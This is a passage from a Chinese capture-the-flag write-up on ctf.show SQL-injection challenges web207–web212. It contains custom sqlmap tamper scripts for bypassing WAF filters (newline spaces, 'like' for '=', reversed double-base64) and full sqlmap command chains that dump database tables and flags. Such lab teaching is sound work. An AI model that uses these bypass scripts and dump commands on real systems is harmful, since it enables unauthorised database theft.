    payload = payload.replace(&#39;union&#39;,&#39;ununionion&#39;)
    return payload
</code></pre>
<p>没有使用tamper之前，我们加上<code>--tech=U</code>来让sqlmap只测试联合查询注入，<code>--flush-session</code>意思是每次刷新会话，清理上次的缓存。</p>
<pre><code>sqlmap -u http://php.local/Less-1/?id=1 --tech=U --flush-session --proxy=http://127.0.0.1:8080 --random-agent --dbms=mysql
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407203933797.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407203933797"></p>

<p>从burp的流量中看到payload是没有双写的，必然会注入失败。而使用了tamper之后</p>
<pre><code>sqlmap -u http://php.local/Less-1/?id=1 --tech=U --flush-session --proxy=http://127.0.0.1:8080 --random-agent --tamper=my --dbms=mysql
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407203955653.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407203955653"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407204001885.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407204001885"></p>

<h3 id="基于http头"><a href="#基于http头" class="headerlink" title="基于http头"></a>基于http头</h3><p>我没使用sqlmap\tamper\xforwardedfor.py的tamper来讲解</p>
<pre><code class="python">def tamper(payload, **kwargs):
    &quot;&quot;&quot;
    Append a fake HTTP header &#39;X-Forwarded-For&#39;
    &quot;&quot;&quot;

    headers = kwargs.get(&quot;headers&quot;, &#123;&#125;)
    headers[&quot;X-Forwarded-For&quot;] = randomIP()
    headers[&quot;X-Client-Ip&quot;] = randomIP()
    headers[&quot;X-Real-Ip&quot;] = randomIP()
    return payload
</code></pre>
<p>从kwargs中取出headers数组，然后修改了xff值达到随机IP的效果，不再赘述。</p>
<h2 id="Tamper-速查"><a href="#Tamper-速查" class="headerlink" title="Tamper 速查"></a>Tamper 速查</h2><table>
<thead>
<tr>
<th>脚本名称</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>apostrophemask.py</td>
<td>用utf8代替引号</td>
</tr>
<tr>
<td>equaltolike.py</td>
<td>like 代替等号</td>
</tr>
<tr>
<td>space2dash.py</td>
<td>绕过过滤’&#x3D;’ 替换空格字符(“)，(‘’ - ‘)后跟一个破折号注释，一个随机字符串和一个新行(‘n’)</td>
</tr>
<tr>
<td>greatest.py</td>
<td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td>
</tr>
<tr>
<td>space2hash.py</td>
<td>空格替换为#号 随机字符串 以及换行符</td>
</tr>
<tr>
<td>apostrophenullencode.py</td>
<td>绕过过滤双引号，替换字符和双引号。</td>
</tr>
<tr>
<td>halfversionedmorekeywords.py</td>
<td>当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</td>
</tr>
<tr>
<td>space2morehash.py</td>
<td>空格替换为 #号 以及更多随机字符串 换行符</td>
</tr>
<tr>
<td>appendnullbyte.py</td>
<td>在有效负荷结束位置加载零字节字符编码</td>
</tr>
<tr>
<td>ifnull2ifisnull.py</td>
<td>绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</td>
</tr>
<tr>
<td>space2mssqlblank.py</td>
<td>空格替换为其它空符号</td>
</tr>
<tr>
<td>base64encode.py</td>
<td>用base64编码替换</td>
</tr>
<tr>
<td>space2mssqlhash.py</td>
<td>替换空格</td>
</tr>
<tr>
<td>modsecurityversioned.py</td>
<td>过滤空格，包含完整的查询版本注释</td>
</tr>
<tr>
<td>space2mysqlblank.py</td>
<td>空格替换其它空白符号(mysql)</td>
</tr>
<tr>
<td>between.py</td>
<td>用between替换大于号(&gt;)</td>
</tr>
<tr>
<td>space2mysqldash.py</td>
<td>替换空格字符(“)(‘ - ‘)后跟一个破折号注释一个新行(‘ n’)</td>
</tr>
<tr>
<td>multiplespaces.py</td>
<td>围绕SQL关键字添加多个空格</td>
</tr>
<tr>
<td>space2plus.py</td>
<td>用+替换空格</td>
</tr>
<tr>
<td>bluecoat.py</td>
<td>代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换&#x3D;为like</td>
</tr>
<tr>
<td>nonrecursivereplacement.py</td>
<td>取代predefined SQL关键字with表示 suitable for替代(例如 .replace(“SELECT”、””)) filters</td>
</tr>
<tr>
<td>space2randomblank.py</td>
<td>代替空格字符(“”)从一个随机的空白字符可选字符的有效集</td>
</tr>
<tr>
<td>sp_password.py</td>
<td>追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</td>
</tr>
<tr>
<td>chardoubleencode.py</td>
<td>双url编码(不处理以编码的)</td>
</tr>
<tr>
<td>unionalltounion.py</td>
<td>替换UNION ALL SELECT UNION SELECT</td>
</tr>
<tr>
<td>charencode.py</td>
<td>url编码</td>
</tr>
<tr>
<td>randomcase.py</td>
<td>随机大小写</td>
</tr>
<tr>
<td>unmagicquotes.py</td>
<td>宽字符绕过 GPC addslashes</td>
</tr>
<tr>
<td>randomcomments.py</td>
<td>用 <code>/**/</code> 分割sql关键字</td>
</tr>
<tr>
<td>charunicodeencode.py</td>
<td>字符串unicode编码</td>
</tr>
<tr>
<td>securesphere.py</td>
<td>追加特制的字符串</td>
</tr>
<tr>
<td>versionedmorekeywords.py</td>
<td>注释绕过</td>
</tr>
<tr>
<td>space2comment.py</td>
<td>Replaces space character <code>&#39; &#39;</code> with comments <code>/**/</code></td>
</tr>
</tbody></table>
<p>我们来试一下哦 web207.py 大概意思就是把空格用 0x0a代替也就是回车</p>
<pre><code class="python">#!/usr/bin/env python

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def tamper(payload,**kwargs):
    payload = space2comment(payload)
    return payload
def space2comment(payload):
    retVal = payload
    if payload:
        retVal = &quot;&quot;
        quote, doublequote , firstspace = False, False ,False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += chr(0x0a)
                    continue
            elif payload[i] == &#39;\&#39;&#39;:
                quote = not quote
            elif payload[i] == &#39;&quot;&#39;:
                doublequote = not doublequote
            elif payload[i] == &quot; &quot; and not doublequote and not quote:
                retVal += chr(0x0a)
                continue
            retVal += payload[i]

    return  retVal
</code></pre>
<p>我们挂一下代理看看是怎么改的</p>
<pre><code>python sqlmap.py -u http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web207 --batch --proxy=&quot;http://127.0.0.1:8080&quot;
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407210406203.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407210406203"></p>

<pre><code>注入点
python sqlmap.py -u http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web207 --batch
数据库
python sqlmap.py -u http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web207 --batch --dbs
表名
python sqlmap.py -u http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web207 --batch -D ctfshow_web --tables
字段名
python sqlmap.py -u http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web207 --batch -D ctfshow_web -T ctfshow_flaxca --columns
数据
python sqlmap.py -u http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web207 --batch -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump
</code></pre>
<h1 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h1><h2 id="小括号闭合-大小写"><a href="#小括号闭合-大小写" class="headerlink" title="小括号闭合,大小写"></a>小括号闭合,大小写</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407210921431.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407210921431"></p>

<p>这时你就需要–prefix和–suffix参数了：</p>
<pre><code>python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;’)&quot; --suffix &quot;AND (’abc’=’abc&quot;
</code></pre>
<pre><code>注入点
python sqlmap.py -u &quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --prefix=&quot;&#39;)&quot; --tamper=&quot;space2comment,randomcase&quot; --batch
数据库
python sqlmap.py -u &quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --prefix=&quot;&#39;)&quot; --tamper=&quot;space2comment,randomcase&quot; --batch --dbs 
表名
python sqlmap.py -u &quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --prefix=&quot;&#39;)&quot; --tamper=&quot;space2comment,randomcase&quot; --batch -D ctfshow_web --tables
字段名
python sqlmap.py -u &quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --prefix=&quot;&#39;)&quot; --tamper=&quot;space2comment,randomcase&quot; --batch -D ctfshow_web -T ctfshow_flaxcac --columns
数据
python sqlmap.py -u &quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --prefix=&quot;&#39;)&quot; --tamper=&quot;space2comment,randomcase&quot; --batch -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump
</code></pre>
<h1 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407215132018.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407215132018"></p>

<h2 id="过滤-等号和空格"><a href="#过滤-等号和空格" class="headerlink" title="过滤* 等号和空格"></a>过滤* 等号和空格</h2><p>web209.py</p>
<pre><code class="python">#!/usr/bin/env python

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def tamper(payload , **kwargs):
    payload = space2comment(payload)
    return payload
def space2comment(payload):
    retVal = payload
    if payload:
        retVal = &quot;&quot;
        quote , doublequote , firstspace = False ,False ,False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += (chr(0x0a)) #return
                    continue
            elif payload[i] ==&quot;\&#39;&quot;:
                quote = not quote
            elif payload[i] == &#39;&quot;&#39;:
                doublequote = not doublequote
            elif payload[i] == &quot;*&quot;:
                retVal += chr(0x31)#1
                continue
            elif payload[i] == &quot;=&quot;:
                retVal += chr(0x0a) + &#39;like&#39; + chr(0x0a)
                continue
            elif payload[i] == &quot; &quot; and not doublequote and not quote:
                retVal += chr(0x0a)
                continue
            retVal += payload[i]
    return retVal
</code></pre>
<pre><code>注入点
python sqlmap.py -u http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web209
数据库
python sqlmap.py -u http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web209 --dbs 
表名
python sqlmap.py -u http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web209 -D ctfshow_web --tables
字段名
python sqlmap.py -u http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web209 -D  ctfshow_web -T  ctfshow_flav --columns
数据
python sqlmap.py -u http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web209 -D  ctfshow_web -T  ctfshow_flav -C ctfshow_flagx --dump
</code></pre>
<h1 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h1><h2 id="base64解密"><a href="#base64解密" class="headerlink" title="base64解密"></a>base64解密</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407214810805.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407214810805"></p>

<p>web210.py</p>
<pre><code class="python">#!/usr/bin/env python
from lib.core.compat import xrange
from lib.core.enums import PRIORITY
import base64

__priority__ = PRIORITY.LOW

def tamper(payload, **kwargs):
    payload = space2comment(payload)
    retVal = &quot;&quot;
    if payload:
        retVal = base64.b64encode(payload[::-1].encode(&#39;utf-8&#39;)) #翻转字符串以utf-8便码成二进制
        retVal = base64.b64encode(retVal[::-1]).decode(&#39;utf-8&#39;)#解码成utf-8
    return retVal

def space2comment(payload):
    retVal = payload
    if payload:
        retVal = &quot;&quot;
        quote, doublequote , firstspqce = False ,False ,False

        for i in xrange(len(payload)):
            if not firstspqce:
                if payload[i].isspace():
                    firstspqce = True
                    retVal += chr(0x0a)
                    continue

            elif payload[i] == &quot;\&#39;&quot;:
                quote = not quote
            elif payload[i] == &#39;&quot;&#39;:
                doublequote = not doublequote
            elif payload[i] == &quot;*&quot;:
                retVal += chr(0x31)
                continue
            elif payload[i] == &quot;=&quot;:
                retVal += chr(0x0a) + &#39;like&#39; + chr(0x0a)
                continue
            elif payload[i] == &quot; &quot;and not doublequote and not quote:
                retVal += chr(0x0a)
                continue
            retVal += payload[i]
        return retVal
</code></pre>
<pre><code>注入点
python sqlmap.py -u http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210
数据库
python sqlmap.py -u http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 --dbs
表名
python sqlmap.py -u http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 --tables -D  ctfshow_web
字段名
python sqlmap.py -u http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 -D ctfshow_web -T  ctfshow_flavi --columns 
数据
python sqlmap.py -u http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 -D ctfshow_web -T  ctfshow_flavi -C ctfshow_flagxx --dump 
</code></pre>
<h1 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h1><h2 id="base64解密翻转字符过滤空格"><a href="#base64解密翻转字符过滤空格" class="headerlink" title="base64解密翻转字符过滤空格"></a>base64解密翻转字符过滤空格</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407221144978.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407221144978"></p>

<p>210脚本</p>
<pre><code>注入点
python sqlmap.py -u http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210
数据库
python sqlmap.py -u http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 --dbs
表名
python sqlmap.py -u http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 --tables -D  ctfshow_web
字段名
python sqlmap.py -u http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 -D ctfshow_web -T  ctfshow_flavia --columns 
数据
python sqlmap.py -u http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 -D ctfshow_web -T  ctfshow_flavia -C ctfshow_flagxxa --dump 
</code></pre>
<h1 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h1><h2 id="base64解密翻转字符过滤空格-1"><a href="#base64解密翻转字符过滤空格-1" class="headerlink" title="base64解密翻转字符过滤空格 *"></a>base64解密翻转字符过滤空格 *</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407221504134.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407221504134"></p>

<p><a target="_blank" rel="noopener" href="http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/">http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/</a></p>
<pre><code>注入点
python sqlmap.py -u http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210
数据库
python sqlmap.py -u http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 --dbs
表名
python sqlmap.py -u http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 --tables -D  ctfshow_web
字段名
python sqlmap.py -u http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 -D ctfshow_web -T  ctfshow_flavis --columns 
数据
